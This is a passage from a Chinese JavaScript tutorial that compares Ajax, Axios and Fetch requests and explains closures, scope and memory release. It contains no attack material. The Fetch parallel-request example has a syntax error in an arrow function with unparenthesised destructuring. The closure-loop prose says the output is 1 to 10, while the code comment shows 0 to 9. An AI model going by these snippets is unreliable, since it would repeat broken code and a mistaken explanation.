language_">console</span>.<span class="hljs-title function_">log</span>(response);<br>  &#125;<br>&#125;;<br><span class="hljs-keyword">const</span> requestData = &#123; <span class="hljs-attr">key</span>: <span class="hljs-string">&#x27;value&#x27;</span> &#125;;<br>xhr.<span class="hljs-title function_">send</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(requestData));<br></code></pre></td></tr></table></figure><p>使用 Axios：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">import</span> axios <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;axios&#x27;</span>;<br><br><span class="hljs-keyword">const</span> requestData = &#123; <span class="hljs-attr">key</span>: <span class="hljs-string">&#x27;value&#x27;</span> &#125;;<br>axios.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;https://api.example.com/post-data&#x27;</span>, requestData, &#123;<br>  <span class="hljs-attr">headers</span>: &#123; <span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;application/json&#x27;</span> &#125;,<br>&#125;)<br>  .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">response</span> =&gt;</span> &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(response.<span class="hljs-property">data</span>);<br>  &#125;)<br>  .<span class="hljs-title function_">catch</span>(<span class="hljs-function"><span class="hljs-params">error</span> =&gt;</span> &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">&#x27;Request failed:&#x27;</span>, error);<br>  &#125;);<br></code></pre></td></tr></table></figure><p>使用 Fetch API：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> requestData = &#123; <span class="hljs-attr">key</span>: <span class="hljs-string">&#x27;value&#x27;</span> &#125;;<br><span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;https://api.example.com/post-data&#x27;</span>, &#123;<br>  <span class="hljs-attr">method</span>: <span class="hljs-string">&#x27;POST&#x27;</span>,<br>  <span class="hljs-attr">headers</span>: &#123; <span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;application/json&#x27;</span> &#125;,<br>  <span class="hljs-attr">body</span>: <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(requestData),<br>&#125;)<br>  .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">response</span> =&gt;</span> &#123;<br>    <span class="hljs-keyword">if</span> (!response.<span class="hljs-property">ok</span>) &#123;<br>      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&#x27;Network response was not ok&#x27;</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span> response.<span class="hljs-title function_">json</span>();<br>  &#125;)<br>  .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">data</span> =&gt;</span> &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(data);<br>  &#125;)<br>  .<span class="hljs-title function_">catch</span>(<span class="hljs-function"><span class="hljs-params">error</span> =&gt;</span> &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">&#x27;Fetch failed:&#x27;</span>, error);<br>  &#125;);<br></code></pre></td></tr></table></figure><p><strong>场景 2：发送多个并行请求并处理结果</strong></p><p>使用 Axios：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">import</span> axios <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;axios&#x27;</span>;<br><br><span class="hljs-keyword">const</span> request1 = axios.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;https://api.example.com/data1&#x27;</span>);<br><span class="hljs-keyword">const</span> request2 = axios.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;https://api.example.com/data2&#x27;</span>);<br><br><span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">all</span>([request1, request2])<br>  .<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">[response1, response2]</span>) =&gt;</span> &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Response 1:&#x27;</span>, response1.<span class="hljs-property">data</span>);<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Response 2:&#x27;</span>, response2.<span class="hljs-property">data</span>);<br>  &#125;)<br>  .<span class="hljs-title function_">catch</span>(<span class="hljs-function"><span class="hljs-params">error</span> =&gt;</span> &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">&#x27;Requests failed:&#x27;</span>, error);<br>  &#125;);<br></code></pre></td></tr></table></figure><p>使用 Fetch API：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> request1 = <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;https://api.example.com/data1&#x27;</span>);<br><span class="hljs-keyword">const</span> request2 = <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;https://api.example.com/data2&#x27;</span>);<br><br><span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">all</span>([request1, request2])<br>  .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">responses</span> =&gt;</span> &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">all</span>(responses.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">response</span> =&gt;</span> &#123;<br>      <span class="hljs-keyword">if</span> (!response.<span class="hljs-property">ok</span>) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&#x27;Network response was not ok&#x27;</span>);<br>      &#125;<br>      <span class="hljs-keyword">return</span> response.<span class="hljs-title function_">json</span>();<br>    &#125;));<br>  &#125;)<br>  .<span class="hljs-title function_">then</span>([data1, data2] =&gt; &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Data 1:&#x27;</span>, data1);<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Data 2:&#x27;</span>, data2);<br>  &#125;)<br>  .<span class="hljs-title function_">catch</span>(<span class="hljs-function"><span class="hljs-params">error</span> =&gt;</span> &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">&#x27;Requests failed:&#x27;</span>, error);<br>  &#125;);<br></code></pre></td></tr></table></figure><p><strong>场景 3：使用拦截器处理请求和响应</strong></p><p>使用 Axios：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">import</span> axios <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;axios&#x27;</span>;<br><br>axios.<span class="hljs-property">interceptors</span>.<span class="hljs-property">request</span>.<span class="hljs-title function_">use</span>(<span class="hljs-function"><span class="hljs-params">config</span> =&gt;</span> &#123;<br>  <span class="hljs-comment">// 添加请求拦截逻辑</span><br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Request interceptor:&#x27;</span>, config);<br>  <span class="hljs-keyword">return</span> config;<br>&#125;);<br><br>axios.<span class="hljs-property">interceptors</span>.<span class="hljs-property">response</span>.<span class="hljs-title function_">use</span>(<span class="hljs-function"><span class="hljs-params">response</span> =&gt;</span> &#123;<br>  <span class="hljs-comment">// 添加响应拦截逻辑</span><br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Response interceptor:&#x27;</span>, response);<br>  <span class="hljs-keyword">return</span> response;<br>&#125;);<br><br>axios.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;https://api.example.com/data&#x27;</span>)<br>  .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">response</span> =&gt;</span> &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(response.<span class="hljs-property">data</span>);<br>  &#125;)<br>  .<span class="hljs-title function_">catch</span>(<span class="hljs-function"><span class="hljs-params">error</span> =&gt;</span> &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">&#x27;Request failed:&#x27;</span>, error);<br>  &#125;);<br></code></pre></td></tr></table></figure><p>请注意，Fetch API 不提供类似的拦截器功能，因此在处理请求和响应时，需要在 <code>fetch</code> 调用之前和之后手动添加逻辑。</p><p>这些示例展示了使用 Ajax、Axios 和 Fetch API 处理复杂场景的方法，包括发送 POST 请求、处理多个并行请求和使用拦截器。选择适合您项目需求和喜好的网络请求库，并根据需要添加适当的功能和逻辑。</p><h3 id="2、变量提升"><a href="#2、变量提升" class="headerlink" title="2、变量提升"></a>2、变量提升</h3><blockquote><p>参考：<a href="https://juejin.cn/post/6933377315573497864">彻底解决 JS 变量提升的面试题</a>(很细，真·彻底解决)</p></blockquote><h3 id="3、闭包"><a href="#3、闭包" class="headerlink" title="3、闭包"></a>3、闭包</h3><p>闭包（Closure）是JavaScript中一个重要且强大的概念，它发生在一个函数内部可以访问该函数外部的变量时。理解闭包对于深入理解JavaScript的作用域和函数的工作方式至关重要。</p><p>以下是对闭包的理解和关键特点：</p><ol><li><p><strong>函数嵌套：</strong> 闭包通常涉及到函数的嵌套。内部函数嵌套在外部函数内部，并且内部函数可以访问外部函数的变量。</p></li><li><p><strong>变量捕获：</strong> 当内部函数引用了外部函数的变量时，即使外部函数已经执行完毕并返回，这些变量仍然会被内部函数引用和保留。这就是闭包的核心特点之一。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">outer</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">var</span> outerVar = <span class="hljs-string">&quot;I am from outer&quot;</span>;<br><br>  <span class="hljs-keyword">function</span> <span class="hljs-title function_">inner</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(outerVar); <span class="hljs-comment">// 内部函数引用了外部函数的变量</span><br>  &#125;<br><br>  <span class="hljs-keyword">return</span> inner; <span class="hljs-comment">// 返回内部函数</span><br>&#125;<br><br><span class="hljs-keyword">var</span> closureFunction = <span class="hljs-title function_">outer</span>(); <span class="hljs-comment">// 调用outer并将内部函数赋值给closureFunction</span><br><span class="hljs-title function_">closureFunction</span>(); <span class="hljs-comment">// 调用内部函数，仍然可以访问outerVar</span><br></code></pre></td></tr></table></figure></li><li><p><strong>保护数据：</strong> 闭包可以用于创建私有变量，因为外部作用域无法直接访问内部函数中的变量。这种方式可以保护数据不被外部意外修改。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">counter</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">var</span> count = <span class="hljs-number">0</span>;<br><br>  <span class="hljs-keyword">return</span> <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>    count++;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(count);<br>  &#125;;<br>&#125;<br><br><span class="hljs-keyword">var</span> increment = <span class="hljs-title function_">counter</span>();<br><span class="hljs-title function_">increment</span>(); <span class="hljs-comment">// 输出1</span><br><span class="hljs-title function_">increment</span>(); <span class="hljs-comment">// 输出2</span><br></code></pre></td></tr></table></figure></li><li><p><strong>延长变量生命周期：</strong> 闭包可以使外部函数的变量在外部函数执行完毕后继续存在，直到内部函数不再被引用。这对于一些特定的需求非常有用，但也需要注意不会造成不必要的内存泄漏。</p></li></ol><p>闭包在JavaScript中的应用非常广泛，它可以用于模块化编程、事件处理、回调函数、异步编程等方面。但要谨慎使用闭包，特别是在处理大量数据时，以避免内存泄漏问题。理解闭包的工作原理和用途对于编写高质量的JavaScript代码非常重要。</p><blockquote><p>了解闭包前先来了解一下上级作用域和堆栈内存释放问题。</p></blockquote><h5 id="上级作用域的概念"><a href="#上级作用域的概念" class="headerlink" title="上级作用域的概念"></a>上级作用域的概念</h5><ul><li>函数的上级作用域在哪里创建的，上级作用域就是谁</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> a = <span class="hljs-number">10</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">foo</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(a)<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">sum</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">var</span> a = <span class="hljs-number">20</span><br>    <span class="hljs-title function_">foo</span>()<br>&#125;<br><br><span class="hljs-title function_">sum</span>()<br><span class="hljs-comment">/* 输出</span><br><span class="hljs-comment">    10</span><br><span class="hljs-comment">/</span><br></code></pre></td></tr></table></figure><blockquote><p><strong>函数 <code>foo()</code> 是在全局下创建的，所以 <code>a</code> 的上级作用域就是 <code>window</code>，输出就是 <code>10</code></strong></p></blockquote><h5 id="思考题"><a href="#思考题" class="headerlink" title="思考题"></a>思考题</h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> n = <span class="hljs-number">10</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">fn</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-keyword">var</span> n =<span class="hljs-number">20</span><br>    <span class="hljs-keyword">function</span> <span class="hljs-title function_">f</span>(<span class="hljs-params"></span>) &#123;<br>       n++;<br>       <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(n)<br>     &#125;<br>    <span class="hljs-title function_">f</span>()<br>    <span class="hljs-keyword">return</span> f<br>&#125;<br><br><span class="hljs-keyword">var</span> x = <span class="hljs-title function_">fn</span>()<br><span class="hljs-title function_">x</span>()<br><span class="hljs-title function_">x</span>()<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(n)<br><span class="hljs-comment">/* 输出</span><br><span class="hljs-comment">*  21</span><br><span class="hljs-comment">    22</span><br><span class="hljs-comment">    23</span><br><span class="hljs-comment">    10</span><br><span class="hljs-comment">/</span><br></code></pre></td></tr></table></figure><p><strong>稍微提个醒，单独的 n++ 和 ++n 表达式的结果是一样的</strong></p><blockquote><p><strong>思路：<code>fn</code> 的返回值是什么变量 <code>x</code> 就是什么，这里 <code>fn</code> 的返回值是函数名 <code>f</code> 也就是 <code>f</code> 的堆内存地址，<code>x()</code> 也就是执行的是函数 <code>f()</code>，而不是 <code>fn()</code>，输出的结果显而易见</strong></p></blockquote><h5 id="JS-堆栈内存释放"><a href="#JS-堆栈内存释放" class="headerlink" title="JS 堆栈内存释放"></a>JS 堆栈内存释放</h5><ul><li>堆内存：存储引用类型值，对象类型就是键值对，函数就是代码字符串。</li><li>堆内存释放：将引用类型的空间地址变量赋值成 <code>null</code>，或没有变量占用堆内存了浏览器就会释放掉这个地址</li><li>栈内存：提供代码执行的环境和存储基本类型值。</li><li>栈内存释放：一般当函数执行完后函数的私有作用域就会被释放掉。</li></ul><blockquote><p><strong>但栈内存的释放也有特殊情况：① 函数执行完，但是函数的私有作用域内有内容被栈外的变量还在使用的，栈内存就不能释放里面的基本值也就不会被释放。② 全局下的栈内存只有页面被关闭的时候才会被释放</strong></p></blockquote><h5 id="闭包是什么"><a href="#闭包是什么" class="headerlink" title="闭包是什么"></a>闭包是什么</h5><blockquote><p>在 JS 忍者秘籍(P90)中对闭包的定义：闭包允许函数访问并操作函数外部的变量。红宝书上对于闭包的定义：闭包是指有权访问另外一个函数作用域中的变量的函数。 MDN 对闭包的定义为：闭包是指那些能够访问自由变量的函数。这里的自由变量是外部函数作用域中的变量。</p></blockquote><blockquote><p>概述上面的话，<strong>闭包是指有权访问另一个函数作用域中变量的函数</strong></p></blockquote><h5 id="形成闭包的原因"><a href="#形成闭包的原因" class="headerlink" title="形成闭包的原因"></a>形成闭包的原因</h5><blockquote><p><strong>内部的函数存在外部作用域的引用就会导致闭包</strong>。从上面介绍的上级作用域的概念中其实就有闭包的例子 <code>return f</code>就是一个表现形式。</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> a = <span class="hljs-number">0</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">foo</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-keyword">var</span> b =<span class="hljs-number">14</span><br>    <span class="hljs-keyword">function</span> <span class="hljs-title function_">fo</span>(<span class="hljs-params"></span>)&#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(a, b)<br>    &#125;<br>    <span class="hljs-title function_">fo</span>()<br>&#125;<br><span class="hljs-title function_">foo</span>()<br></code></pre></td></tr></table></figure><blockquote><p>这里的子函数 <code>fo</code> 内存就存在外部作用域的引用 <code>a, b</code>，所以这就会产生闭包</p></blockquote><h5 id="闭包变量存储的位置"><a href="#闭包变量存储的位置" class="headerlink" title="闭包变量存储的位置"></a>闭包变量存储的位置</h5><blockquote><p>直接说明：<strong>闭包中的变量存储的位置是堆内存。</strong></p></blockquote><ul><li>假如闭包中的变量存储在栈内存中，那么栈的回收 会把处于栈顶的变量自动回收。所以闭包中的变量如果处于栈中那么变量被销毁后，闭包中的变量就没有了。所以闭包引用的变量是出于堆内存中的。</li></ul><h5 id="闭包的作用"><a href="#闭包的作用" class="headerlink" title="闭包的作用"></a>闭包的作用</h5><ul><li>保护函数的私有变量不受外部的干扰。形成不销毁的栈内存。</li><li>保存，把一些函数内的值保存下来。闭包可以实现方法和属性的私有化</li></ul><h5 id="闭包经典使用场景"><a href="#闭包经典使用场景" class="headerlink" title="闭包经典使用场景"></a>闭包经典使用场景</h5><ul><li><ol><li><code>return</code> 回一个函数</li></ol></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> n = <span class="hljs-number">10</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">fn</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-keyword">var</span> n =<span class="hljs-number">20</span><br>    <span class="hljs-keyword">function</span> <span class="hljs-title function_">f</span>(<span class="hljs-params"></span>) &#123;<br>       n++;<br>       <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(n)<br>     &#125;<br>    <span class="hljs-keyword">return</span> f<br>&#125;<br><br><span class="hljs-keyword">var</span> x = <span class="hljs-title function_">fn</span>()<br><span class="hljs-title function_">x</span>() <span class="hljs-comment">// 21</span><br></code></pre></td></tr></table></figure><blockquote><p>这里的 return <code>f</code>, <code>f()</code>就是一个闭包，存在上级作用域的引用。</p></blockquote><ul><li><ol><li>函数作为参数</li></ol></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> a = <span class="hljs-string">&#x27;林一一&#x27;</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">foo</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-keyword">var</span> a = <span class="hljs-string">&#x27;foo&#x27;</span><br>    <span class="hljs-keyword">function</span> <span class="hljs-title function_">fo</span>(<span class="hljs-params"></span>)&#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(a)<br>    &#125;<br>    <span class="hljs-keyword">return</span> fo<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">f</span>(<span class="hljs-params">p</span>)&#123;<br>    <span class="hljs-keyword">var</span> a = <span class="hljs-string">&#x27;f&#x27;</span><br>    <span class="hljs-title function_">p</span>()<br>&#125;<br><span class="hljs-title function_">f</span>(<span class="hljs-title function_">foo</span>())<br><span class="hljs-comment">/* 输出</span><br><span class="hljs-comment">*   foo</span><br><span class="hljs-comment">/ </span><br></code></pre></td></tr></table></figure><blockquote><p>使用 return <code>fo</code> 返回回来，<code>fo()</code> 就是闭包，<code>f(foo())</code> 执行的参数就是函数 <code>fo</code>，因为 <code>fo() 中的 a</code> 的上级作用域就是函数<code>foo()</code>，所以输出就是<code>foo</code></p></blockquote><ul><li><ol><li>IIFE（自执行函数）</li></ol></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> n = <span class="hljs-string">&#x27;林一一&#x27;</span>;<br>(<span class="hljs-keyword">function</span> <span class="hljs-title function_">p</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(n)<br>&#125;)()<br><span class="hljs-comment">/* 输出</span><br><span class="hljs-comment">*   林一一</span><br><span class="hljs-comment">/ </span><br></code></pre></td></tr></table></figure><blockquote><p>同样也是产生了闭包<code>p()</code>，存在 <code>window</code>下的引用 <code>n</code>。</p></blockquote><ul><li><ol><li>循环赋值</li></ol></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">for</span>(<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i&lt;<span class="hljs-number">10</span>; i++)&#123;<br>  (<span class="hljs-keyword">function</span>(<span class="hljs-params">j</span>)&#123;<br>       <span class="hljs-built_in">setTimeout</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(j)<br>    &#125;, <span class="hljs-number">1000</span>) <br>  &#125;)(i)<br>&#125;<br><span class="hljs-comment">// 输出：0 1 2 3 4 5 6 7 8 9</span><br></code></pre></td></tr></table></figure><blockquote><p>因为存在闭包的原因上面能依次输出1~10，闭包形成了10个互不干扰的私有作用域。将外层的自执行函数去掉后就不存在外部作用域的引用了，输出的结果就是连续的 10。为什么会连续输出10，因为 JS 是单线程的遇到异步的代码不会先执行(会入栈)，等到同步的代码执行完 <code>i++</code> 到 10时，异步代码才开始执行此时的 <code>i=10</code> 输出的都是 10。</p></blockquote><ul><li><ol><li>使用回调函数就是在使用闭包</li></ol></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-variable language_">window</span>.<span class="hljs-property">name</span> = <span class="hljs-string">&#x27;林一一&#x27;</span><br><span class="hljs-built_in">setTimeout</span>(<span class="hljs-keyword">function</span> <span class="hljs-title function_">timeHandler</span>(<span class="hljs-params"></span>)&#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">window</span>.<span class="hljs-property">name</span>);<br>&#125;, <span class="hljs-number">100</span>)<br></code></pre></td></tr></table></figure><ul><li><ol><li>节流防抖</li></ol></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">// 节流</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">throttle</span>(<span class="hljs-params">fn, timeout</span>) &#123;<br>    <span class="hljs-keyword">let</span> timer = <span class="hljs-literal">null</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">function</span> (<span class="hljs-params">...arg</span>) &#123;<br>        <span class="hljs-keyword">if</span>(timer) <span class="hljs-keyword">return</span><br>        timer = <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>            fn.<span class="hljs-title function_">apply</span>(<span class="hljs-variable language_">this</span>, arg)<br>            timer = <span class="hljs-literal">null</span><br>        &#125;, timeout)<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// 防抖</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">debounce</span>(<span class="hljs-params">fn, timeout</span>)&#123;<br>    <span class="hljs-keyword">let</span> timer = <span class="hljs-literal">null</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">function</span>(<span class="hljs-params">...arg</span>)&#123;<br>        <span class="hljs-built_in">clearTimeout</span>(timer)<br>        timer = <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>            fn.<span class="hljs-title function_">apply</span>(<span class="hljs-variable language_">this</span>, arg)<br>        &#125;, timeout)<br>    